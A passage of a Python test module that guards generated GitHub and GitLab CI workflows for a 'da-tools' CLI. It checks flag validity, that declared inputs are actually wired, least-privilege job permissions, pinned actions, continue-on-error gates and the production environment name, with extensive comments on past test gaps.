# `--prometheus` is injected by entrypoint.py only for the PROMETHEUS_COMMANDS
# set, and `--config-dir` is an ordinary per-subcommand argument. Exempting them
# re-opened the exact class this guard closes: adding `--prometheus` to the
# shipped Stage 1 left 93 passed while the step exited 2 on every run.
#
# ⛔⛔ The lesson is narrower than "verify docs": this constant was written one
# round AFTER a finding whose stated conclusion was "when a chain of reasoning
# rests on a document, verify the document" — and it was written by copying a
# document. The trigger has to fire at the moment a sentence is about to become
# a constant or an exemption list, not only while chasing a bug. Exemptions are
# derived from code below; nothing here is transcribed from prose.
_CLI_GLOBAL_FLAGS = {"--help"}


def _prometheus_commands() -> set[str]:
    """Subcommands entrypoint.py injects `--prometheus` into, read from source."""
    tree = ast.parse(_ENTRYPOINT.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        names = {t.id for t in node.targets if isinstance(t, ast.Name)}
        if "PROMETHEUS_COMMANDS" not in names:
            continue
        if isinstance(node.value, (ast.Set, ast.List, ast.Tuple)):
            return {
                e.value for e in node.value.elts
                if isinstance(e, ast.Constant) and isinstance(e.value, str)
            }
    return set()


_SHELL_SEPARATORS = frozenset({"&&", "||", ";", ";;", "|", "&", "(", ")"})


def _command_argvs(text: str) -> list[list[str]]:
    """Each shell command in a scalar, as argv. Comments already stripped.

    Deliberately a local helper rather than an import from the sibling guard:
    that file is a different test module, and a cross-module import would make
    one suite's collection depend on the other's. The derivation is the same —
    tokenise with shlex, split on the operators that end a command — so a flag
    belonging to a LATER command in a `&&` chain is not attributed to an
    earlier subcommand.
    """
    argvs: list[list[str]] = []
    for raw in re.sub(r"\\\n\s*", " ", text).split("\n"):
        line = raw.strip()
        if not line:
            continue
        lex = shlex.shlex(line, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        try:
            tokens = list(lex)
        except ValueError:
            continue  # unbalanced quote: not a command this guard can read
        current: list[str] = []
        for tok in tokens:
            if tok in _SHELL_SEPARATORS:
                if current:
                    argvs.append(current)
                current = []
            else:
                current.append(tok)
        if current:
            argvs.append(current)
    return argvs


def _walk_scalars(node):
    """Every string scalar in a parsed YAML document."""
    if isinstance(node, str):
        yield node
    elif isinstance(node, list):
        for v in node:
            yield from _walk_scalars(v)
    elif isinstance(node, dict):
        for v in node.values():
            yield from _walk_scalars(v)


def _da_tools_subcommands() -> dict[str, set[str]]:
    """subcommand -> the long flags its script actually declares.

    ⛔ DERIVED end to end: the subcommand list comes from the image entrypoint's
    own dispatch table, and each flag set from that script's `add_argument`
    calls. Nothing here is transcribed, because a transcription would go stale
    exactly when it matters.

    This exists because the generated artifacts invoke OUR OWN CLI and nothing
    checked that the flags are real. Both validators are blind to it — actionlint
    and the GitLab schema grade YAML, and a wrong flag is a runtime error — so
    the shipped Stage 1 ran `validate-config … --ci` against a script that
    declares no `--ci`, exited 2 on every run for every customer, and took
    `generate` and `apply` down with it via `needs:`. Measured through the real
    dispatcher: `unrecognized arguments: --ci`, exit 2.
    """
    tree = ast.parse(_ENTRYPOINT.read_text(encoding="utf-8"))
    dispatch: dict[str, str] = {}
    for node in ast.walk(tree):
        if not isinstance(node, ast.Dict):
            continue
        pairs = {
            k.value: v.value
            for k, v in zip(node.keys, node.values)
            if isinstance(k, ast.Constant) and isinstance(v, ast.Constant)
            and isinstance(k.value, str) and isinstance(v.value, str)
        }
        if pairs and all(str(v).endswith(".py") for v in pairs.values()):
            dispatch.update(pairs)
    assert len(dispatch) >= 5, (
        f"only {len(dispatch)} subcommand→script entries found in "
        f"{_ENTRYPOINT} — the dispatch-table reader stopped matching, so the "
        "flag check below would grade almost nothing."
    )

    promq = _prometheus_commands()
    out: dict[str, set[str]] = {}
    for sub, script in dispatch.items():
        hits = list(_REPO_ROOT.glob(f"scripts/tools/**/{script}"))
        if not hits:
            continue
        flags: set[str] = set()
        for n in ast.walk(ast.parse(hits[0].read_text(encoding="utf-8"))):
            if (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                    and n.func.attr == "add_argument"):
                flags.update(
                    a.value for a in n.args
                    if isinstance(a, ast.Constant) and isinstance(a.value, str)
                    and a.value.startswith("--")
                )
        # `--prometheus` is injected by the entrypoint, not declared by the
        # script — so it is legal for exactly the commands that list names.
        if sub in promq:
            flags.add("--prometheus")
        out[sub] = flags
    assert out, "no da-tools scripts resolved — the glob stopped matching"
    return out


# Where `language: docker_image` puts the working tree. Not a style choice we
# get to make: pre_commit/languages/docker.py builds the `docker run` itself
# with `-v <cwd>:/src:rw,Z --workdir /src`, so this is the container-side name
# of the customer's repo and the only path in there that resolves to it.
_PRECOMMIT_MOUNT = "/src"


@functools.lru_cache(maxsize=1)
def _da_tools_positionals() -> dict[str, tuple[str, ...]]:
    """subcommand -> the POSITIONAL argument names its script declares.

    Cached: this parses the entrypoint plus ~50 tool scripts, and it is called
    from inside a per-hook loop that is itself parametrized nine ways. Without
    the cache the file's runtime went from 46s to 133s.

    Same derivation as ``_da_tools_subcommands`` (entrypoint dispatch table →
    each script's ``add_argument`` calls), reading the other half of the call:
    an ``add_argument`` whose first literal does NOT start with ``-`` declares a
    positional. Needed because "does this command accept a bare filename?" is a
    real question the pre-commit artifact's ``pass_filenames`` setting asks, and
    the answer has to come from argparse rather than from a hand-kept list.
    """
    tree = ast.parse(_ENTRYPOINT.read_text(encoding="utf-8"))
    dispatch: dict[str, str] = {}
    for node in ast.walk(tree):
        if not isinstance(node, ast.Dict):
            continue
        pairs = {
            k.value: v.value
            for k, v in zip(node.keys, node.values)
            if isinstance(k, ast.Constant) and isinstance(v, ast.Constant)
            and isinstance(k.value, str) and isinstance(v.value, str)
        }
        if pairs and all(str(v).endswith(".py") for v in pairs.values()):
            dispatch.update(pairs)

    out: dict[str, tuple[str, ...]] = {}
    for sub, script in dispatch.items():
        hits = list(_REPO_ROOT.glob(f"scripts/tools/**/{script}"))
        if not hits:
            continue
        names: list[str] = []
        for n in ast.walk(ast.parse(hits[0].read_text(encoding="utf-8"))):
            if (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                    and n.func.attr == "add_argument" and n.args):
                first = n.args[0]
                if (isinstance(first, ast.Constant)
                        and isinstance(first.value, str)
                        and not first.value.startswith("-")):
                    names.append(first.value)
        out[sub] = tuple(names)
    assert out, "no da-tools scripts resolved — the glob stopped matching"
    return out


def _strip_shell_comments(text: str) -> str:
    """`run:`/`script:` text with shell comments removed, line by line.

    ⛔ YAML parsing removes YAML comments; it does NOT touch a `#` inside a
    `run:` block, because there the `#` is part of the scalar. So moving an
    "is this knob read?" search from the raw file into the parsed steps closes
    only half the class — the prose just moved inside the string. Measured: with
    the dead #1361 input restored (12 failed), adding one line
    `# TODO: honour ${{ inputs.dry_run }}` to an existing `run:` block dropped it
    to 8 failed, with both kustomize combinations fully green and the dead knob
    still shipping.

    ⛔ Derived from the shell rule, and STRICTLY STRONGER than the nearest
    existing helpers — an earlier version of this docstring cited a
    `_strip_bash_comment` in the nightly-scan guard as the shared source. No
    such symbol exists anywhere in the repo; that citation was fabricated. What
    does exist is whole-LINE stripping (`test_nightly_scan_matrix_drift.py`'s
    `startswith("#")`) and `check_workflow_git_push_permissions.py`'s
    `_strip_shell_comment_lines`, whose own docstring says a trailing `# …`
    after real code is out of scope. Both would miss the trailing-comment case
    this function exists for, so the rule here is stated from first principles:
    a `#` begins a comment when it starts a word — line start or after unquoted
    whitespace — and never inside `'`/`"`. Stripping too much only makes a "was
    it read" test harder to satisfy, i.e. a false RED.
    """
    out = []
    for line in text.split("\n"):
        quote = ""
        cut = len(line)
        for i, ch in enumerate(line):
            if quote:
                if ch == quote:
                    quote = ""
            elif ch in "'\"":
                quote = ch
            elif ch == "#" and (i == 0 or line[i - 1].isspace()):
                cut = i
                break
        out.append(line[:cut])
    return "\n".join(out)


def _unwired_knobs(workflow: dict) -> list[str]:
    """Declared knobs that never reach anything that executes.

    ⛔ TWO HOPS, because one hop is defeated by a single line. The knobs are
    `workflow_dispatch.inputs.*` AND the `env:` names the workflow declares —
    both are things a customer can edit expecting an effect.

    The first version of this check searched a surface that INCLUDED the
    workflow-level `env:` block, so that an input bound to an env var counted as
    wired. That kills a real false positive and creates a worse false negative:
    `env: {DRY_RUN: ${{ inputs.dry_run }}}` with nothing reading `$DRY_RUN`
    scored as wiring. Measured: the dead #1361 input alone → 12 failed; the same
    input plus that one `env:` line → 93 passed, with the operator ticking
    "Dry-run mode (no actual apply)" and getting a real production apply. The
    binding is not the wiring — it is the first half of it.

    So: an env binding is followed to its VARIABLE NAME, and that name must
    itself appear in an executable position. Direct `inputs.<name>` references
    in a `run:`/`if:`/`with:` still count, which is the other legal shape.
    """
    # ⛔ SCOPED, because GitHub's `env:` is. The first two-hop version pooled
    # every job's steps into one `executable` string while collecting bindings
    # from workflow AND job level — so a binding in job A satisfied a read in
    # job B, where that variable does not exist. That is the aggregation bug
    # (for-all quietly becoming exists) one level below the one this file had
    # already fixed in the GitLab rules loop. Measured: job A binding
    # `NS: ${{ inputs.target_ns }}` and never reading it, job B doing
    # `kubectl -n ${{ env.NS }}`, scored as wired — while B's `env.NS` is
    # undefined at runtime.
    #
    # Visibility, precisely: workflow `env:` is visible everywhere; a job's
    # `env:` only inside that job; a step's `env:` only inside that step. Step
    # level is included because it is the MOST idiomatic wiring point and its
    # absence made the correct artifact fail (the docstring used to claim it was
    # searched; it was not).
    def _reads(text: str, name: str) -> bool:
        return bool(
            re.search(rf"\$\{{?{re.escape(name)}(?![\w-])", text)
            or re.search(rf"env\.{re.escape(name)}(?![\w-])", text)
        )

    def _binds(mapping, token: str) -> list[str]:
        return [
            str(k) for k, v in (mapping or {}).items()
            if re.search(rf"{re.escape(token)}(?![\w-])", str(v))
        ]

    wf_env = workflow.get("env") or {}

    def _wired(token: str) -> bool:
        for job in workflow["jobs"].values():
            job_env = job.get("env") or {}
            # A job-level `if:` is an executable position for the token itself,
            # not only for env-name reads. `if: ${{ inputs.dry_run == 'false' }}`
            # on the apply job is one of the most natural ways to honour a
            # dry-run knob, and it was reported as unwired while the docstring
            # claimed job `if:` was searched — true for the env half, false here.
            if re.search(rf"{re.escape(token)}(?![\w-])", str(job.get("if", ""))):
                return True
            job_text_parts = [str(job.get("if", ""))]
            for step in (job.get("steps") or []):
                step_env = step.get("env") or {}
                step_text = (
                    f"{step.get('if', '')}\n"
                    f"{_strip_shell_comments(str(step.get('run', '')))}\n"
                    f"{step.get('with', '')}"
                )
                job_text_parts.append(step_text)
                if re.search(rf"{re.escape(token)}(?![\w-])", step_text):
                    return True
                # a step-level binding is only readable by that same step
                if any(_reads(step_text, n) for n in _binds(step_env, token)):
                    return True
            job_text = "\n".join(job_text_parts)
            # job- and workflow-level bindings are readable anywhere in this job
            for scope_env in (job_env, wf_env):
                if any(_reads(job_text, n) for n in _binds(scope_env, token)):
                    return True
        return False

    triggers = workflow.get(True) or workflow.get("on") or {}
    inputs = ((triggers.get("workflow_dispatch") or {}).get("inputs") or {})
    dead = [f"inputs.{n}" for n in inputs if not _wired(f"inputs.{n}")]
    # Workflow-level `env:` knobs are the same class: a customer edits the one
    # namespace-looking name in the file and nothing changes. Visible in every
    # job, so a single pooled read is the right test for these.
    all_text = "\n".join(
        f"{s.get('if', '')}\n{_strip_shell_comments(str(s.get('run', '')))}\n"
        f"{s.get('with', '')}"
        for job in workflow["jobs"].values()
        for s in ([{"if": job.get("if", "")}] + list(job.get("steps") or []))
    )
    dead += [f"env.{n}" for n in wf_env if not _reads(all_text, str(n))]
    return sorted(dead)


def _assert_github_deploy_contract(
    workflow: dict, label: str, expected_perms: dict, expected_triggers: dict,
    expected_uses: list[str], expects_lint: bool,
) -> None:
    """Properties that must hold for EVERY generated GitHub workflow.

    ⛔ Shared on purpose. Three separate checks were written against the CLI
    artifact only, and the portal preview — a second, hand-written copy of the
    same workflow that the wizard shows customers as a "copy me" sample — was
    left ungraded by all three. Measured, each against a 93-passed baseline:
    adding `permissions: {contents: write, id-token: write}` to the preview's
    `apply` job → 93 passed; restoring the dead #1361 `dry_run` input to the
    preview → 93 passed. Both defects this PR removed from the CLI could be
    re-shipped from the other generator without a single test going red.

    Putting the properties in one function called from both call sites is the
    structural version of "fix the class, not the cited instance": a future
    property added here cannot be added to one leg only.
    """
    # (1) Job-level `permissions:` overrides the workflow-level grant entirely,
    # so pinning only the top block measures the half that loses.
    # ⛔ EFFECTIVE permissions per job, both directions. GitHub's job block
    # REPLACES the workflow block wholesale — it does not merge — so a job that
    # lists fewer scopes has silently DROPPED the rest.
    #
    # The first form of this rule only compared the scopes a job listed against
    # the workflow grant, i.e. it watched widening alone. Measured: adding
    # `permissions: {contents: read}` to the `generate` job left 95 passed and
    # zero red — while that job's only output, the sticky PR comment, goes back
    # to 403ing. That is exactly the defect this PR added the block to fix, put
    # back by a plausible "tighten this job" edit.
    #
    # (The old comment also justified the relaxation with an artifact the rule
    # actually rejected — top-level `contents: read` plus `pull-requests: write`
    # on `generate` alone. Under effective-permissions that shape is legal and
    # strictly better, so the justification is now true as well as stated.)
    _RANK = {"none": 0, "read": 1, "write": 2}

    def _rank(v) -> int:
        return _RANK.get(str(v), 99)

    # Scopes a step demands, keyed by what the step uses. Derived from the
    # action's API surface, not from the job it happens to sit in.
    # ⛔ `actions/checkout` is in here because it is the step EVERY job runs and
    # it needs `contents: read` on a private repository — the customer's normal
    # case. Measured: `permissions: {}` on the `validate` job left 95 passed
    # while checkout 403s and the whole validate stage dies before it starts.
    # The rule claimed to be bidirectional and was not: the widening half was
    # live (a job granting `contents: write` reds 6), the demand half knew one
    # action.
    #
    # ⚠️ STATED LIMIT, because this derivation cannot be complete: it reads
    # `uses:`, so a step doing `run: gh api --method POST .../comments` demands
    # nothing as far as this rule can tell.
    #
    # ⛔ The compensating control is the `uses:` SET pinned below — and the
    # earlier version of this comment named `_EXPECTED_GH_JOBS` and the portal's
    # pin instead, which was false twice over: the former pins job NAMES, and the
    # latter only covers the portal leg. Measured against that claim: adding a
    # fifth step `uses: peter-evans/create-or-update-comment@v4` to the CLI
    # `generate` job left 95 passed, and renaming all four `actions/checkout@v4`
    # to `evil-fork/checkout@v1` also left 95 passed — the second is worse,
    # because `_demands` matches on the action name, so RENAMING an action
    # exempts it from its own scope requirement. That is selection on a marker
    # the subject chooses for itself, the exact shape this file criticises
    # elsewhere. The set pin removes the choice.
    _NEEDS: dict[str, tuple[str, str]] = {
        "actions/checkout": ("contents", "read"),
        "marocchino/sticky-pull-request-comment": ("pull-requests", "write"),
    }

    # ⛔ Floor. `_NEEDS` is consumed by a loop, which is the shape in this file
    # that retires SILENTLY — the same one `_EXPECTED_GL_JOB_RULES` got a floor
    # for, in this same file, and this dict was missed. Measured: `_NEEDS = {}`
    # left 84 passed even with `permissions: {}` on `validate`, i.e. the entire
    # demand half of the rule disappears without a red run.
    assert len(_NEEDS) >= 2, (
        f"_NEEDS has {len(_NEEDS)} entries — emptying it makes the demand half "
        "of the permissions rule a no-op that still reports green."
    )
    # ⛔ BIND the two lists. The comment above calls the `uses:` set pin the
    # compensating control for this table — prose only, until now: they were two
    # independent hand-written lists, and the floor above proves the dict is
    # non-empty, not that it covers the pinned actions. So adding an action reds
    # the `uses:` pin, whose message says "add it to `_NEEDS` too" — and the
    # edit that clears the red is `expected_uses` alone, leaving the new
    # action's scope requirement unenforced forever. Naming the
    # demands-nothing actions explicitly is what makes the omission deliberate.
    _NEEDS_NOTHING = {"actions/upload-artifact", "actions/download-artifact"}
    unclassified = sorted(
        {u.split("@")[0] for u in expected_uses} - set(_NEEDS) - _NEEDS_NOTHING
    )
    assert not unclassified, (
        f"{label}: action(s) {unclassified} are pinned in the `uses:` set but "
        "appear in neither `_NEEDS` nor `_NEEDS_NOTHING`. Decide which: give it "
        "the scope it needs, or record that it needs none. An action in neither "
        "list is one whose token requirements nothing checks."
    )

    def _demands(step: dict) -> list[tuple[str, str]]:
        uses = str(step.get("uses", "")).split("@")[0]
        return [need for action, need in _NEEDS.items() if uses == action]

    for jname, job in workflow["jobs"].items():
        effective = job["permissions"] if "permissions" in job else expected_perms

        # What THIS job's steps actually demand, derived from `_NEEDS`.
        demanded: dict[str, str] = {}
        for step in (job.get("steps") or []):
            for scope, needed in _demands(step):
                if _rank(needed) > _rank(demanded.get(scope, "none")):
                    demanded[scope] = needed

        # ⛔ The ceiling used to be "never exceed the workflow grant", and that
        # rule contradicted its own message. The message says `apply` is the
        # `environment: production` job and therefore the worst place to widen —
        # a statement about WHICH job, while the check said NO job may widen.
        # The round that introduced it was explicitly trying to permit the
        # least-privilege shape (`pull-requests: write` on `generate` alone) and
        # blocked exactly that instead.
        #
        # It also encoded a rule this platform does not follow: 6 of its own
        # workflows widen at job level in 9 places, and `bench-on-demand.yaml`'s
        # `gate` job is the identical shape (`contents: read` at the top,
        # `pull-requests: write` on the one job that comments).
        #
        # ⚠️ This check exists on the GitHub leg only, and that is NOT the
        # "one of a pair" defect this file keeps finding: GitLab has no
        # job-level `permissions:` concept at all — its jobs carry a
        # project-wide `CI_JOB_TOKEN` whose scope is configured outside the
        # pipeline file. There is nothing on that leg for a mirror of this rule
        # to read.
        #
        # So the ceiling is now the job's OWN demand, unioned with the workflow
        # baseline: a job may hold a scope it can justify by a step that needs
        # it, and nothing more. `apply` runs checkout / kustomize / kubectl and
        # demands no `pull-requests`, so granting it any is still red — which is
        # what the original message was actually reaching for.
        for scope, value in effective.items():
            ceiling = max(
                _rank(expected_perms.get(scope, "none")),
                _rank(demanded.get(scope, "none")),
            )
            assert _rank(value) <= ceiling, (
                f"{label}: job {jname!r} has effective `{scope}: {value}`, but "
                f"the workflow grant is `{scope}: "
                f"{expected_perms.get(scope, 'none')}` and no step in that job "
                f"demands more than `{demanded.get(scope, 'none')}`. A scope no "
                "step uses is a scope that only widens the blast radius — and "
                "`apply` is the `environment: production` job, the worst place "
                "for it."
            )
        for step in (job.get("steps") or []):
            for scope, needed in _demands(step):
                assert _rank(effective.get(scope, "none")) >= _rank(needed), (
                    f"{label}: job {jname!r} runs {step.get('uses')!r}, which "
                    f"needs `{scope}: {needed}`, but its EFFECTIVE grant is "
                    f"`{scope}: {effective.get(scope, 'none')}`.\n"
                    "A job-level `permissions:` block REPLACES the workflow-level "
                    "one rather than merging, so listing fewer scopes drops the "
                    "rest — the step 403s and the customer silently loses its "
                    "output. Grant the scope on the job, or remove the block."
                )
    # ⛔ This equality pins the CURRENT shape, which is not the best one, and
    # saying so here is the point: the `pull-requests: write` scope lives at
    # workflow level, so `apply` — the job carrying `environment: production` —
    # inherits a scope only `generate`'s sticky-comment step needs. The
    # effective-permissions block above already argues that a narrower job-level
    # grant is "strictly better", and then this line makes the better shape RED.
    #
    # Moving the scope onto `generate` is a two-part change, and doing only the
    # first half breaks the build: the `_rank` check above rejects a job block
    # that WIDENS beyond the workflow default, which is exactly what a
    # `generate`-only `pull-requests: write` would be once the workflow level
    # drops to `contents: read`. That rule has already been reworked twice
    # (blanket ban → effective-permissions model), so re-opening it belongs in
    # its own change with its own counterfactuals, not bolted onto this one.
    #
    # Severity for the record: `pull-requests: write` grants no cluster access
    # and `apply` is `workflow_dispatch`-only behind a protected environment, so
    # the excess scope is a least-privilege wart rather than a live hole.
    assert workflow.get("permissions") == expected_perms, (
        f"{label}: permissions are {workflow.get('permissions')!r}, expected "
        f"{expected_perms!r}. If you are moving `pull-requests: write` onto the "
        "`generate` job, read the note above first — the `_rank` narrowing rule "
        "has to change in the same commit or the new shape fails there instead."
    )

    # (2) Every declared knob must reach an EXECUTABLE position.
    unread = _unwired_knobs(workflow)
    assert not unread, (
        f"{label}: declared knob(s) {unread} never reach anything that runs. A "
        "knob wired to nothing is worse than no knob — the operator believes "
        "they changed the run's behaviour and they did not (#1361). Wire it to "
        "a `run:`/`if:`/`with:` (directly, or through an `env:` binding that "
        "some step actually reads), or delete it."
    )

    # (1b) The action set, pinned WITH its versions. Renaming an action exempted
    # it from `_NEEDS`; adding one brought a new API surface with no scope
    # review. Versions are pinned too because `actions/checkout@v1` satisfied a
    # name-only pin on both legs while behaving differently.
    used = sorted(
        str(s["uses"])
        for job in workflow["jobs"].values()
        for s in (job.get("steps") or [])
        if s.get("uses")
    )
    assert used == expected_uses, (
        f"{label}: `uses:` set is {used}, expected {expected_uses}.\n"
        "A new action arrives with an API surface nobody scoped, and a RENAMED "
        "one silently exempts itself from the permissions demand table. Add it "
        "here and to `_NEEDS` together, with the scope it needs."
    )

    # (2b) The trigger's FILTERS, not just its event names.
    triggers_decl = workflow.get(True) or workflow.get("on") or {}
    assert triggers_decl == expected_triggers, (
        f"{label}: `on:` is {triggers_decl!r}, expected "
        f"{expected_triggers!r}.\nEvent names alone do not say whether the "
        "workflow ever fires: a `paths:` that matches nothing, or a `branches:` "
        "naming a branch that does not exist, leaves validate and generate dead "
        "on every PR while `apply` stays a live production deploy."
    )

    # (1c) Every `da-tools <sub> --flag` this workflow runs must be a real flag,
    # and `lint` must keep `--ci`. ⛔ Both properties were added to the CLI leg
    # only. Measured: re-adding `--ci` to the portal preview's validate step left
    # 104 passed while the identical edit on the CLI leg reds 6; dropping `--ci`
    # from the GitHub lint step left 93 passed while the GitLab one reds 6. This
    # helper exists precisely so a new property cannot land on one leg — the two
    # newest properties landed on one leg anyway, so they move in here.
    declared = _da_tools_subcommands()
    lint_seen = False
    for job in workflow["jobs"].values():
        for step in (job.get("steps") or []):
            for argv in _command_argvs(_strip_shell_comments(str(step.get("run", "")))):
                for i, tok in enumerate(argv):
                    if tok not in declared:
                        continue
                    used = {t.split("=")[0] for t in argv[i + 1:] if t.startswith("--")}
                    unknown = sorted(used - declared[tok] - _CLI_GLOBAL_FLAGS)
                    assert not unknown, (
                        f"{label}: `da-tools {tok}` is passed {unknown}, which "
                        f"it does not declare (it has {sorted(declared[tok])}). "
                        "argparse exits 2 on an unrecognised flag, so the step "
                        "fails every run and `needs:` takes the rest down."
                    )
                    if tok == "lint":
                        lint_seen = True
                        assert "--ci" in argv, (
                            f"{label}: `da-tools lint` without `--ci` ({argv}). "
                            "Without it the deny-list prints ERRORs and exits 0, "
                            "so the job goes green on denied PromQL."
                        )
    # The portal preview is a simplified sample with no lint step; the CLI
    # artifact has one. Each leg DECLARES which it is, so "no lint found" can
    # never quietly mean "the extractor broke".
    assert lint_seen == expects_lint, (
        f"{label}: lint invocation found={lint_seen}, expected={expects_lint}. "
        "If the leg gained or lost its lint step, say so here — otherwise the "
        "`--ci` pin above passes vacuously."
    )

    # (2c) A gate that is allowed to fail is not a gate. GitHub counts a
    # `continue-on-error` job's FAILURE as success when evaluating `needs:`, so
    # one line turns the whole `needs: [validate]` edge this PR pins into
    # decoration and `apply` deploys config that failed schema/routing/policy
    # validation. Measured: `continue-on-error: true` on `validate` left 95
    # passed. The repo already treats this as a check-defeating mechanism for
    # its OWN workflows (tests/dx/test_pr_preflight_checks.py) — that rule had
    # simply never been swept onto the artifacts we generate.
    # ⛔ BOTH levels. GitHub accepts `continue-on-error` on a job AND on each
    # step, and the step form is the more dangerous one: the step is recorded
    # failed while the JOB concludes success, so `needs: [validate]` is satisfied
    # by a `validate` that failed schema/routing/policy. Measured: one line on
    # the validate step left 95 passed, zero red.
    # ⛔ The sibling guard already had this derivation
    # (tests/ops/test_nightly_scan_matrix_drift.py, `step.get("continue-on-error",
    # job_coe)`) and only the job half was carried over here — a rule present in
    # one guard file and missing in the other is the most repeated defect in this
    # PR, so it is worth stating that this is the same rule, not a new one.
    for jname, job in workflow["jobs"].items():
        job_coe = job.get("continue-on-error", False)
        assert str(job_coe).lower() == "false", (
            f"{label}: job {jname!r} sets `continue-on-error: {job_coe!r}`. A "
            "failure there is reported as success to every job that `needs:` it, "
            "so the validation gate stops gating and the production deploy runs "
            "on unvalidated config."
        )
        for step in (job.get("steps") or []):
            step_coe = step.get("continue-on-error", job_coe)
            assert str(step_coe).lower() == "false", (
                f"{label}: step {step.get('name', step.get('uses'))!r} in job "
                f"{jname!r} sets `continue-on-error: {step_coe!r}`. The step is "
                "recorded as failed but the JOB still concludes success, so "
                "every `needs:` edge downstream is satisfied by a job whose work "
                "did not succeed."
            )

    # (3) The deploy job must still NAME its environment. Three separate pieces
    # of reasoning in this file rest on `apply` carrying `environment:
    # production`, and the GitLab side asserts its equivalent — this side did
    # not, and deleting the key from all three deploy branches left 93 passed.
    # It is also the only mitigation currently available for the stated
    # boundary that GitHub's `apply` is dispatchable from an unmerged branch:
    # an environment carries required reviewers and deployment branch policies.
    # ⛔ Both spellings. GitHub's `environment:` may be a string OR a mapping
    # (`{name: production, url: …}`), and the GitLab twin already handled the
    # mapping form while this leg compared a raw string — so the idiomatic edit
    # that adds a deployment URL would red with a message claiming the
    # environment was RENAMED. One-leg-of-a-pair again, in the direction of a
    # false red rather than a miss, but a misleading message is its own defect.
    apply_env = (workflow["jobs"].get("apply") or {}).get("environment")
    if isinstance(apply_env, dict):
        apply_env = apply_env.get("name")
    # ⛔ The NAME, not just its presence. GitHub's environment protection rules
    # (required reviewers, deployment branch policy) are bound to the name, and
    # this file's own stated boundary — that `apply` is gated on the EVENT and
    # not on the ref — names those protections as the only mitigation. Renaming
    # the environment silently decouples every rule attached to it, and
    # `assert apply_env` could not tell. Measured: renaming it in all six deploy
    # branches left 95 passed. A boundary must not rest on an unenforced fact.
    # One assertion, not two: an earlier version kept a follow-up `assert
    # apply_env` AFTER this equality, so it could never fail and its message —
    # the one explaining why the environment is load-bearing — was unreachable.
    # The explanation belongs in the message that can actually fire.
    assert apply_env == "production", (
        f"{label}: the `apply` job's environment is {apply_env!r}, not "
        "'production' (absent reads as None).\nThat key is load-bearing: the "
        "job is gated on the workflow_dispatch EVENT and not on the ref, so its "
        "required reviewers / deployment branch policy are the only thing "
        "standing between a dispatch from an unmerged branch and the customer's "
        "cluster — and GitHub attaches those rules to the NAME, so a rename "
        "detaches them as surely as a deletion."
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_github_permissions_grant_what_the_steps_actually_need(
    generated, ci, deploy
) -> None:
    """⛔ The `permissions:` VALUE, not just the key.

    `_EXPECTED_GH_TOP_LEVEL` pins that a `permissions:` block exists. That is
    only half a contract, and the missing half is the load-bearing one: dropping
    `pull-requests: write` and keeping `permissions: {contents: read}` left the
    key set identical and the whole suite green, while shipping back exactly the
    403 the block was added to prevent.

    The grant is checked TOGETHER with the step that needs it, so the two cannot
    drift apart: if the PR-comment step is ever removed, this test fails and
    asks for the scope to be re-derived rather than silently blessing a
    write scope nothing uses.
    """
    workflow = yaml.safe_load(
        (generated[(ci, deploy)] / _GH_WORKFLOW).read_text(encoding="utf-8")
    )
    steps = [s for job in workflow["jobs"].values() for s in (job.get("steps") or [])]
    commenters = [s for s in steps if "sticky-pull-request-comment" in str(s.get("uses", ""))]
    assert commenters, (
        "no PR-comment step in the generated workflow — the `pull-requests: "
        "write` grant below would then be a scope nothing uses. Re-derive the "
        "permissions block against whatever replaced it."
    )
    # The CLI artifact additionally needs `pull-requests: write`, because unlike
    # the portal preview it really does post a sticky PR comment. (That grant
    # cannot help a FORK PR — GitHub hard-locks that token to read-only
    # regardless of this block.)
    _assert_github_deploy_contract(
        workflow,
        f"CLI artifact (--ci {ci} --deploy {deploy})",
        # Workflow-level baseline only. `pull-requests: write` now lives on the
        # `generate` job, where the ceiling rule justifies it from that job's
        # own sticky-comment step — see the note beside that check.
        {"contents": "read"},
        _CLI_GH_TRIGGERS,
        _cli_gh_uses(deploy),
        expects_lint=True,
    )


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_every_declared_workflow_input_is_read_by_something(
    generated, ci, deploy
) -> None:
    """A declared knob that nothing reads is a lie told to the customer.

    #1361 was exactly this: `workflow_dispatch.inputs.dry_run` existed, looked
    like a safety switch, and no step referenced it — an operator ticking it got
    a real apply. Removing it fixed the instance; this asserts the CLASS, so the
    next dead input reds instead of shipping.

    Derived rather than enumerated: the check is "every declared input name is
    referenced from the executable surface", not "the input list equals []" — a
    future input that IS wired stays legal without editing this test. The
    The executable surface is every job's `if:` and every step's
    `if:`/`run:`/`with:` — NOT the `env:` blocks, which are bindings rather than
    reads (counting them as reads is the false negative `_unwired_knobs`
    documents). A binding is followed one hop, at its own visibility: workflow
    `env:` everywhere, a job's `env:` inside that job, a step's `env:` inside
    that step. Comments are excluded on purpose, and names match as whole tokens
    so a short input cannot ride on a longer one.
    """
    text = (generated[(ci, deploy)] / _GH_WORKFLOW).read_text(encoding="utf-8")
    workflow = yaml.safe_load(text)
    # `on:` parses to the boolean True under YAML 1.1, hence the `True` key.
    triggers = workflow.get(True) or workflow.get("on") or {}
    dispatch = triggers.get("workflow_dispatch") or {}
    declared = set((dispatch.get("inputs") or {}))

    # ⛔ Searched in the STEPS, not in the file's text. `f"inputs.{name}" not in
    # text` was the first form and it is satisfied by a comment — this generator
    # emits large comment blocks into its output, so measured: restoring the
    # #1361 input plus one line `# TODO: wire inputs.dry_run into the apply
    # steps` left the suite at 93 passed with the defect fully back. The subject
    # of "does anything READ this" is the executable surface, never the prose
    # next to it. (Same class as the run:/prose confusion fixed in the nightly
    # scan guard — a class fixed in one file has to be swept in the others.)
    # ⛔ ONE implementation, shared with `_assert_github_deploy_contract`. This
    # test used to carry its own copy of the reachability logic, which is the
    # two-legs problem in miniature: the copies drift, and the weaker one is the
    # one that keeps passing.
    unread = [k for k in _unwired_knobs(workflow) if k.startswith("inputs.")]
    assert not unread, (
        f"workflow_dispatch declares input(s) {unread} that no step reads "
        "(searched as a whole token in the executable surface — every job's "
        "`if:` and every step's `if:`/`run:`/`with:` — plus ONE hop through an "
        "`env:` binding at its own visibility. `env:` blocks are bindings, not "
        "reads: binding a knob to a variable nothing reads is not wiring.)\n"
